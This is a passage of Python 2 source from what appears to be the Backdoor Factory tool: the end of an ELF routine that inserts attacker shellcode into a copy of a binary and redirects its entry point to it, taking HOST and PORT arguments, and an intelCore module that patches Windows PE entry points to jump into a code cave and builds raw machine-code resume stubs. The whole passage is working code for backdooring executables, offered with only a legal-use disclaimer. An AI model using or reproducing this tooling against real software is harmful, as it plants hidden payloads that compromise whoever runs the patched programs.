        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
        6. Increase p_shoff by PAGE_SIZE in the ELF header
        7. Patch the insertion code (parasite) to jump to the entry point (original)
        1. Locate the text segment program header
            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
            -Increase p_filesz by account for the new code (parasite)
            -Increase p_memsz to account for the new code (parasite)
        2. For each phdr who's segment is after the insertion (text segment)
            -increase p_offset by PAGE_SIZE
        3. For the last shdr in the text segment
            -increase sh_len by the parasite length
        4. For each shdr who's section resides after the insertion
            -Increase sh_offset by PAGE_SIZE
        5. Physically insert the new code (parasite) and pad to PAGE_SIZE, 
            into the file - text segment p_offset + p_filesz (original)
        '''
        self.support_check()
        if self.supported is False:
            "ELF Binary not supported"
            sys.exit(-1)
        
        self.output_options()

        if not os.path.exists("backdoored"):
            os.makedirs("backdoored")
        os_name = os.name
        if os_name == 'nt':
            self.backdoorfile = "backdoored\\" + self.OUTPUT
        else:
            self.backdoorfile = "backdoored/" +  self.OUTPUT

        shutil.copy2(self.FILE, self.backdoorfile)

        self.gather_file_info()
        self.set_shells()
        print "[*] Patching Binary"
        self.bin_file = open(self.backdoorfile, "r+b")
        
        shellcode = self.shellcode
        
        newBuffer = len(shellcode)
        
        self.bin_file.seek(24, 0)
    
        sh_addr = 0x0
        offsetHold = 0x0
        sizeOfSegment = 0x0 
        shellcode_vaddr = 0x0
        headerTracker = 0x0
        PAGE_SIZE = 4096
        #find range of the first PT_LOAD section
        for header, values in self.prog_hdr.iteritems():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print "Found text segment"
                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.e_entry
                sizeOfNewSegment = values['p_memsz'] + newBuffer
                LOCofNewSegment = values['p_filesz'] + newBuffer
                headerTracker = header
                newOffset = values['p_offset'] + values['p_filesz']
        
        #SPLIT THE FILE
        self.bin_file.seek(0)
        file_1st_part = self.bin_file.read(newOffset)
        #print file_1st_part.encode('hex')
        newSectionOffset = self.bin_file.tell()
        file_2nd_part = self.bin_file.read()

        self.bin_file.close()
        #print "Reopen file for adjustments"
        self.bin_file = open(self.backdoorfile, "w+b")
        self.bin_file.write(file_1st_part)
        self.bin_file.write(shellcode)
        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
        self.bin_file.write(file_2nd_part)
        if self.EI_CLASS == 0x01:
            #32 bit FILE
            #update section header table
            self.bin_file.seek(24, 0)
            self.bin_file.seek(8, 1)
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(20, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(20, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(16, 1)
                else:
                    self.bin_file.seek(40,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff,0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(4, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(32,1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            self.bin_file.write(struct.pack(self.endian + "I", shellcode_vaddr))
           
            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry -5
           
        else:
            #64 bit FILE
            self.bin_file.seek(24, 0)
            self.bin_file.seek(16, 1)
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(24, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(32, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(32, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(64,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff,0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(32, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(8, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(40, 1)
                else:
                    self.bin_file.seek(56,1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            self.bin_file.write(struct.pack(self.endian + "Q", shellcode_vaddr))
           
            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry -5    

        self.bin_file.close()
        print "[!] Patching Complete"
        return True

# END elfbin clas

def main(): 
    if len(sys.argv) != 5:
        print "Usage:", sys.argv[0], "FILE shellcode HOST PORT"
        sys.exit()
    supported_file = elfbin(sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]))
    Result = supported_file.run_this()
    
if __name__ == "__main__":
    main()
########NEW FILE########
__FILENAME__ = intelCore
'''
 
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.


'''


import struct
import random
from binascii import unhexlify

#Might make this a class
class intelCore():

    nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]

    jump_codes = [int('0xe9', 16), int('0xeb', 16), int('0xea', 16)]

    opcode32 = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
                '0x0104': 3, '0x0105': 6, '0x0106': 2, '0x0107': 2,
                '0x0108': 2, '0x0109': 2, '0x010a': 2, '0x010b': 2,
                '0x010c': 3, '0x010d': 6, '0x010e': 2, '0x010f': 2,
                '0x0110': 2, '0x0111': 2, '0x0112': 2, '0x0113': 2,
                '0x0114': 3, '0x0115': 6, '0x0116': 2, '0x0117': 2,
                '0x0118': 2, '0x0119': 2, '0x011a': 2, '0x011b': 2,
                '0x011c': 3, '0x011d': 6, '0x011e': 2, '0x011f': 2,
                '0x0120': 2, '0x0121': 2, '0x0122': 2, '0x0123': 2,
                '0x0124': 3, '0x0125': 6, '0x0126': 2, '0x0127': 2,
                '0x0128': 2, '0x0129': 2, '0x012a': 2, '0x012b': 2,
                '0x012c': 3, '0x012d': 6, '0x012e': 2, '0x012f': 2,
                '0x0130': 2, '0x0131': 2, '0x0132': 2, '0x0133': 2,
                '0x0134': 3, '0x0135': 6, '0x0136': 2, '0x0137': 2,
                '0x0138': 2, '0x0139': 2, '0x013A': 2, '0x013b': 2,
                '0x013c': 3, '0x013d': 6, '0x013e': 2, '0x013f': 2,
                '0x0140': 2, '0x0141': 3, '0x0142': 3, '0x0143': 3,
                '0x0144': 4, '0x0145': 3, '0x0146': 3, '0x0147': 3,
                '0x0148': 3, '0x0149': 3, '0x014a': 3, '0x014b': 3,
                '0x014c': 4, '0x014d': 3, '0x014e': 3, '0x014f': 3,
                '0x0150': 3, '0x0151': 3, '0x0152': 3, '0x0153': 3,
                '0x0154': 4, '0x0155': 3, '0x0156': 3, '0x0157': 3,
                '0x0158': 3, '0x0159': 3, '0x015a': 3, '0x015b': 3,
                '0x015c': 4, '0x015d': 3, '0x015e': 3, '0x015f': 3,
                '0x0160': 3, '0x0161': 3, '0x0162': 3, '0x0163': 3,
                '0x0164': 4, '0x0165': 3, '0x0166': 3, '0x0167': 3,
                '0x0168': 3, '0x0169': 3, '0x016a': 3, '0x016b': 3,
                '0x016c': 4, '0x016d': 3, '0x016e': 3, '0x016f': 3,
                '0x0170': 3, '0x0171': 3, '0x0172': 3, '0x0173': 3,
                '0x0174': 4, '0x0175': 3, '0x0176': 3, '0x0177': 3,
                '0x0178': 3, '0x0179': 3, '0x017a': 3, '0x017b': 3,
                '0x017c': 4, '0x017d': 3, '0x017e': 3, '0x017f': 3,
                '0x0180': 6, '0x0181': 6, '0x0182': 6, '0x0183': 6,
                '0x0184': 7, '0x0185': 6, '0x0186': 6, '0x0187': 6,
                '0x0188': 6, '0x0189': 6, '0x018a': 6, '0x0184': 6,
                '0x018c': 7, '0x018d': 6, '0x018e': 6, '0x018f': 6,
                '0x0190': 6, '0x0191': 6, '0x0192': 6, '0x0193': 6,
                '0x0194': 7, '0x0195': 6, '0x0196': 6, '0x0197': 6,
                '0x0198': 6, '0x0199': 6, '0x019a': 6, '0x019b': 6,
                '0x019c': 7, '0x019d': 6, '0x019e': 6, '0x019f': 6,
                '0x01a0': 6, '0x01a1': 6, '0x01a2': 6, '0x01a3': 6,
                '0x01a4': 7, '0x01a5': 6, '0x01a6': 6, '0x01a7': 6,
                '0x01a8': 6, '0x01a9': 6, '0x01aa': 6, '0x01ab': 6,
                '0x01ac': 7, '0x01ad': 6, '0x01ae': 6, '0x01af': 6,
                '0x01b0': 6, '0x01b1': 6, '0x01b2': 6, '0x01b3': 6,
                '0x01b4': 7, '0x01b5': 6, '0x01b6': 6, '0x01b7': 6,
                '0x01b8': 6, '0x01b9': 6, '0x01ba': 6, '0x01bb': 6,
                '0x01bc': 7, '0x01bd': 6, '0x01be': 6, '0x01bf': 6,
                '0x01c0': 2, '0x01c1': 2, '0x01c2': 2, '0x01c3': 2,
                '0x01c4': 2, '0x01c5': 2, '0x01c6': 2, '0x01c7': 2,
                '0x01c8': 2, '0x01c9': 2, '0x01ca': 2, '0x01cb': 2,
                '0x01cc': 2, '0x01cd': 2, '0x01ce': 2, '0x01cf': 2,
                '0x0f34': 2, '0x31ed': 2, '0x89e1': 2, '0x83e4': 3,
                '0x2b': 2,
                '40': 1, '0x41': 1, '0x42': 1, '0x43': 1,
                '0x44': 1, '0x45': 1, '0x46': 1, '0x47': 1,
                '0x48': 1, '0x49': 1, '0x4a': 1, '0x4b': 1,
                '0x4c': 1, '0x4d': 1, '0x4e': 1, '0x4f': 1,
                '0x50': 1, '0x51': 1, '0x52': 1, '0x53': 1,
                '0x54': 1, '0x55': 1, '0x56': 1, '0x57': 1,
                '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
                '0x5c': 1, '0x5d': 1, '0x5e': 1, '0x5f': 1,
                '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
                '0x6203': 2, '0x66': 1, '0x623a': 2,
                '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
                '0x6208': 2, '0x6209': 2, '0x620a': 2, '0x620b': 2,
                '0x620c': 3, '0x64a0': 6, '0x64a1': 6, '0x64a2': 6,
                '0x64a3': 6, '0x64a4': 2, '0x64a5': 2, '0x64a6': 2,
                '0x64a7': 2, '0x64a8': 3, '0x64a9': 6, '0x64aa': 2,
                '0x64ab': 2, '0x64ac': 2, '0x64ad': 2, '0x64ae': 2,
                '0x64af': 2,
                '0x6a': 2,
                '0x70': 2, '0x71': 2, '0x72': 2, '0x73': 2,
                '0x74': 2, '0x75': 2, '0x76': 2, '0x77': 2,
                '0x78': 2,
                '0x79': 2, '0x8001': 3, '0x8002': 3,
                '0x8b45': 3, '0x8945': 3, '0x837d': 4, '0x8be5': 2,
                '0x880a': 2, '0x8bc7': 2, '0x8bf4': 2, '0x893e': 2,
                '0x8965': 3, '0xff15': 6, '0x8b4e': 3, '0x8b46': 3,
                '0x8b76': 3, '0x8915': 6, '0x8b56': 3, '0x83f9': 3,
                '0x81ec': 6, '0x837d': 4, '0x8b5d': 3, '0x8b75': 3,
                '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2, '0x83c4': 3,
                '0x83ec': 3, '0x8bec': 2, '0x8bf6': 2, '0x85c0': 2,
                '0x33c0': 2, '0x33c9': 2, '0x89e5': 2, '0x89ec': 3,
                '0x9c': 1,
                '0xc70424': 7, '0xc9': 1, '0xff25': 6,
                '0xff1410': 3, '0xff1490': 3, '0xff1450': 3,
                '0xe8': 5, '0x68': 5, '0xe9': 5,
                '0xbf': 5, '0xbe': 5,
                '0xcc': 1, '0xcd': 2,
                '0xffd3': 2,
                '0x33f6': 2,
                '0x895c24': 4, '0x8da424': 7, '0x8d4424': 4,
                '0xa1': 5, '0xa3': 5, '0xc3': 1,
                '0xeb': 2, '0xea': 7,
                '0xb9': 5, '0xba': 5, '0xbb': 5, '0xb8': 5, 
                }

    opcode64 = {'0x4150':2,'0x4151': 2, '0x4152': 2, '0x4153': 2, '0x4154': 2,
                '0x4155': 2,'0x4156': 2, '0x4157': 2,
                '0x4881ec': 7,
                '0x4883c0': 4, '0x4883c1': 4, '0x4883c2': 4, '0x4883c3': 4,
                '0x4883c4': 4, '0x4883c5': 4, '0x4883c6': 4, '0x4883c7': 4,
                '0x4883c8': 4, '0x4883c9': 4, '0x4883ca': 4, '0x4883cb': 4,
                '0x4883cc': 4, '0x4883cd': 4, '0x4883ce': 4, '0x4883cf': 4,
                '0x4883d0': 4, '0x4883d1': 4, '0x4883d2': 4, '0x4883d3': 4,
                '0x4883d4': 4, '0x4883d5': 4, '0x4883d6': 4, '0x4883d7': 4,
                '0x4883d8': 4, '0x4883d9': 4, '0x4883da': 4, '0x4883db': 4,
                '0x4883dc': 4, '0x4883dd': 4, '0x4883de': 4, '0x4883df': 4,
                '0x4883e0': 4, '0x4883e1': 4, '0x4883e2': 4, '0x4883e3': 4,
                '0x4883e4': 4, '0x4883e5': 4, '0x4883e6': 4, '0x4883e7': 4,
                '0x4883e8': 4, '0x4883e9': 4, '0x4883ea': 4, '0x4883eb': 4,
                '0x4883ec': 4, '0x4883ed': 4, '0x4883ee': 4, '0x4883ef': 4,
                '0x4883f0': 4, '0x4883f1': 4, '0x4883f2': 4, '0x4883f3': 4,
                '0x4883f4': 4, '0x4883f5': 4, '0x4883f6': 4, '0x4883f7': 4,
                '0x4883f8': 4, '0x4883f9': 4, '0x4883fa': 4, '0x4883fb': 4,
                '0x4883fc': 4, '0x4883fd': 4, '0x4883fe': 4, '0x4883ff': 4,
                '0x488bc0': 3, '0x488bc1': 3, '0x488bc2': 3, '0x488bc3': 3,
                '0x488bc4': 3, '0x488bc5': 3, '0x488bc6': 3, '0x488bc7': 3,
                '0x488bc8': 3, '0x488bc9': 3, '0x488bca': 3, '0x488bcb': 3,
                '0x488bcc': 3, '0x488bcd': 3, '0x488bce': 3, '0x488bcf': 3,
                '0x488bd0': 3, '0x488bd1': 3, '0x488bd2': 3, '0x488bd3': 3,
                '0x488bd4': 3, '0x488bd5': 3, '0x488bd6': 3, '0x488bd7': 3,
                '0x488bd8': 3, '0x488bd9': 3, '0x488bda': 3, '0x488bdb': 3,
                '0x488bdc': 3, '0x488bdd': 3, '0x488bde': 3, '0x488bdf': 3,
                '0x488be0': 3, '0x488be1': 3, '0x488be2': 3, '0x488be3': 3,
                '0x488be4': 3, '0x488be5': 3, '0x488be6': 3, '0x488be7': 3,
                '0x488be8': 3, '0x488be9': 3, '0x488bea': 3, '0x488beb': 3,
                '0x488bec': 3, '0x488bed': 3, '0x488bee': 3, '0x488bef': 3,
                '0x488bf0': 3, '0x488bf1': 3, '0x488bf2': 3, '0x488bf3': 3,
                '0x488bf4': 3, '0x488bf5': 3, '0x488bf6': 3, '0x488bf7': 3,
                '0x488bf8': 3, '0x488bf9': 3, '0x488bfa': 3, '0x488bfb': 3,
                '0x488bfc': 3, '0x488bfd': 3, '0x488bfe': 3, '0x488bff': 3,
                '0x48895c': 5, '0x4989d1': 3,
                }

    def __init__(self, flItms, file_handle, VERBOSE):
        self.f = file_handle
        self.flItms = flItms
        self.VERBOSE = VERBOSE


    def opcode_return(self, OpCode, instr_length):
        _, OpCode = hex(OpCode).split('0x')
        OpCode = unhexlify(OpCode)
        return OpCode

    def ones_compliment(self):
        """
        Function for finding two random 4 byte numbers that make
        a 'ones compliment'
        """
        compliment_you = random.randint(1, 4228250625)
        compliment_me = int('0xFFFFFFFF', 16) - compliment_you
        if self.VERBOSE is True:
            print "First ones compliment:", hex(compliment_you)
            print "2nd ones compliment:", hex(compliment_me)
            print "'AND' the compliments (0): ", compliment_you & compliment_me
        self.compliment_you = struct.pack('<I', compliment_you)
        self.compliment_me = struct.pack('<I', compliment_me)
        
    def assembly_entry(self):
        if hex(self.CurrInstr) in self.opcode64:
            opcode_length = self.opcode64[hex(self.CurrInstr)]
        elif hex(self.CurrInstr) in self.opcode32:
            opcode_length = self.opcode32[hex(self.CurrInstr)]
        if self.instr_length == 7:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(7) + '\x00')[0])
        if self.instr_length == 6:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(6) + '\x00\x00')[0])
        if self.instr_length == 5:
            self.InstrSets[self.CurrInstr] = (struct.unpack('<Q', self.f.read(5) +
                                              '\x00\x00\x00')[0])
        if self.instr_length == 4:
            self.InstrSets[self.CurrInstr] = struct.unpack('<I', self.f.read(4))[0]
        if self.instr_length == 3:
            self.InstrSets[self.CurrInstr] = struct.unpack('<I', self.f.read(3) + '\x00')[0]
        if self.instr_length == 2:
            self.InstrSets[self.CurrInstr] = struct.unpack('<H', self.f.read(2))[0]
        if self.instr_length == 1:
            self.InstrSets[self.CurrInstr] = struct.unpack('<B', self.f.read(1))[0]
        if self.instr_length == 0:
            self.InstrSets[self.CurrInstr] = 0
        self.flItms['VrtStrtngPnt'] = (self.flItms['VrtStrtngPnt'] +
                                       opcode_length)
        CallValue = (self.InstrSets[self.CurrInstr] +
                     self.flItms['VrtStrtngPnt'] +
                     opcode_length)
        self.flItms['ImpList'].append([self.CurrRVA, self.InstrSets, CallValue,
                                       self.flItms['VrtStrtngPnt'],
                                       self.instr_length])
        self.count += opcode_length
        return self.InstrSets, self.flItms, self.count

    def pe32_entry_instr(self):
        """
        This fuction returns a list called self.flItms['ImpList'] that tracks the first
        couple instructions for reassembly after the shellcode executes.
        If there are pe entry instructions that are not mapped here,
        please send me the first 15 bytes (3 to 4 instructions on average)
        for the executable entry point once loaded in memory.  If you are
        familiar with olly/immunity it is the first couple instructions
        when the program is first loaded.
        """
        print "[*] Reading win32 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        loop_count = 0
        self.flItms['ImpList'] = []
        while True:
            self.InstrSets = {}
            for i in range(1, 5):
                self.f.seek(self.flItms['LocOfEntryinCode'] + self.count)
                self.CurrRVA = self.flItms['VrtStrtngPnt'] + self.count
                if i == 1:
                    self.CurrInstr = struct.unpack('!B', self.f.read(i))[0]
                elif i == 2:
                    self.CurrInstr = struct.unpack('!H', self.f.read(i))[0]
                elif i == 3:
                    self.CurrInstr = struct.unpack('!I', '\x00' + self.f.read(3))[0]
                elif i == 4:
                    self.CurrInstr = struct.unpack('!I', self.f.read(i))[0]
                if hex(self.CurrInstr) in self.opcode32:
                    self.instr_length = self.opcode32[hex(self.CurrInstr)] - i
                    self.InstrSets, self.flItms, self.count = self.assembly_entry()
                    break

            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

            loop_count += 1
            if loop_count >= 10:
                print "This program's initial opCodes are not planned for"
                print "Please contact the developer."
                self.flItms['supported'] = False
                break
        self.flItms['count_bytes'] = self.count
        return self.flItms, self.count

    def pe64_entry_instr(self):
        """
        For x64 files
        """

        print "[*] Reading win64 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        loop_count = 0
        self.flItms['ImpList'] = []
        check64 = 0
        while True:
            #need to self.count offset from vrtstartingpoint
            self.InstrSets = {}
            if check64 >= 4:
                check32 = True
            else:
                check32 = False
            for i in range(1, 5):
                self.f.seek(self.flItms['LocOfEntryinCode'] + self.count)
                self.CurrRVA = self.flItms['VrtStrtngPnt'] + self.count
                if i == 1:
                    self.CurrInstr = struct.unpack('!B', self.f.read(i))[0]
                elif i == 2:
                    self.CurrInstr = struct.unpack('!H', self.f.read(i))[0]
                elif i == 3:
                    self.CurrInstr = struct.unpack('!I', '\x00' + self.f.read(3))[0]
                elif i == 4:
                    self.CurrInstr = struct.unpack('!I', self.f.read(i))[0]
                if check32 is False:
                    if hex(self.CurrInstr) in self.opcode64:
                        self.instr_length = self.opcode64[hex(self.CurrInstr)] - i
                        self.InstrSets, self.flItms, self.count = self.assembly_entry()
                        check64 = 0
                        break
                    else:
                        check64 += 1
                elif check32 is True:
                    if hex(self.CurrInstr) in self.opcode32:
                        self.instr_length = self.opcode32[hex(self.CurrInstr)] - i
                        self.InstrSets, self.flItms, self.count = self.assembly_entry()
                        check64 = 0
                        break


            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

            loop_count += 1
            if loop_count >= 10:
                print "This program's initial opCodes are not planned for"
                print "Please contact the developer."
                self.flItms['supported'] = False
                break
        self.flItms['count_bytes'] = self.count
        return self.flItms, self.count

    def patch_initial_instructions(self):
        """
        This function takes the flItms dict and patches the
        executable entry point to jump to the first code cave.
        """
        print "[*] Patching initial entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        #This is the JMP command in the beginning of the
        #code entry point that jumps to the codecave
        self.f.write(struct.pack('=B', int('E9', 16)))
        if self.flItms['JMPtoCodeAddress'] < 0:
            self.f.write(struct.pack('<I', 0xffffffff + self.flItms['JMPtoCodeAddress']))
        else: 
            self.f.write(struct.pack('<I', self.flItms['JMPtoCodeAddress']))
        #align the stack if the first OpCode+instruction is less
        #than 5 bytes fill with      to align everything. Not a for loop.
        FrstOpCode = self.flItms['ImpList'][0][1].keys()[0]

        if hex(FrstOpCode) in self.opcode64:
            opcode_length = self.opcode64[hex(FrstOpCode)]
        elif hex(FrstOpCode) in self.opcode32:
            opcode_length = self.opcode32[hex(FrstOpCode)]
        if opcode_length == 7:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=B', int('90', 16)))
        if opcode_length == 6:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
        if opcode_length == 5:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                #self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
                pass
        if opcode_length == 4:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16)))
        if opcode_length == 3:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=B', int('90', 16)))
        if opcode_length == 2:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
        if opcode_length == 1:
            if self.flItms['count_bytes'] % 5 != 0 and self.flItms['count_bytes'] < 5:
                self.f.write(struct.pack('=BBB', int('90', 16),
                                    int('90', 16),
                                    int('90', 16)))


    def resume_execution_64(self):
        """
        For x64 exes...
        """
        verbose = False
        print "[*] Creating win64 resume execution stub"
        resumeExe = ''
        total_opcode_len = 0
        for item in self.flItms['ImpList']:
            OpCode_address = item[0]
            OpCode = item[1].keys()[0]
            instruction = item[1].values()[0]
            ImpValue = item[2]
            instr_length = item[4]
            if hex(OpCode) in self.opcode64:
                total_opcode_len += self.opcode64[hex(OpCode)]
            elif hex(OpCode) in self.opcode32:
                total_opcode_len += self.opcode32[hex(OpCode)]
            else:
                "Warning OpCode not found"
            if verbose is True:
                if instruction:
                    print 'instruction', hex(instruction)
                else:
                    print "single opcode, no instruction"

            self.ones_compliment()

            if OpCode == int('e8', 16):  # Call instruction
                resumeExe += "\x48\x89\xd0"  # mov rad,rdx
                resumeExe += "\x48\x83\xc0"  # add rax,xxx
                resumeExe += struct.pack("<B", total_opcode_len)  # length from vrtstartingpoint after call
                resumeExe += "\x50"  # push rax
                if instruction <= 4294967295:
                    resumeExe += "\x48\xc7\xc1"  # mov rcx, 4 bytes
                    resumeExe += struct.pack("<I", instruction)
                elif instruction > 4294967295:
                    resumeExe += "\x48\xb9"  # mov rcx, 8 bytes
                    resumeExe += struct.pack("<Q", instruction)
                else:
                    print "So close.."
                    print ("Contact the dev with the exe and instruction=",
                           instruction)
                    sys.exit()
                resumeExe += "\x48\x01\xc8"  # add rax,rcx
                #-----
                resumeExe += "\x50"
                resumeExe += "\x48\x31\xc9"  # xor rcx,rcx
                resumeExe += "\x48\x89\xf0"  # mov rax, rsi
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_you
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif OpCode in self.jump_codes:
                #Let's beat ASLR
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     self.flItms['JMPtoCodeAddress'] +
                                     len(shellcode) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', self.flItms['VrtStrtngPnt'])
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue - 5)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif instr_length == 7:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 6:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 5:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 4:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<I", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 3:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBB", instruction)
                ReturnTrackingAddress = item[3]

